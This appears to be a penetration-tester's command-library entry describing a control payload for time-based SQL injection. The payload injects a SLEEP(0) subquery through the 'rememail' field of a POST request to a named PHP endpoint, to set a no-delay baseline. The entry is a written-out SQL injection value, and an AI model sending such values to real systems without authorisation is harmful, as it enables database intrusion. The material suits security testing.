---
id: cmd-uuid-3
data: rememail=test@att.net'+(select*from(select(sleep(0)))a)+'
tags:
  - sqli
  - control
type: command
output: No delay
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.957Z'
verified: false
validated: true
submitted: true
---
# Sleep Control Test

## Command

```bash
# Burp Suite: POST /elist/viewem6.php
# Body: rememail=test@att.net'+(select*from(select(sleep(0)))a)+'
```

## Description

Control payload with SLEEP(0) to verify no inherent delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rememail | Control payload | Yes |

## Examples

### Basic Usage

```bash
# As above
```

## Expected Output

Immediate response, matching baseline.

## Related

- [[procedures/Test-Time-Based-SQL-Injection]]
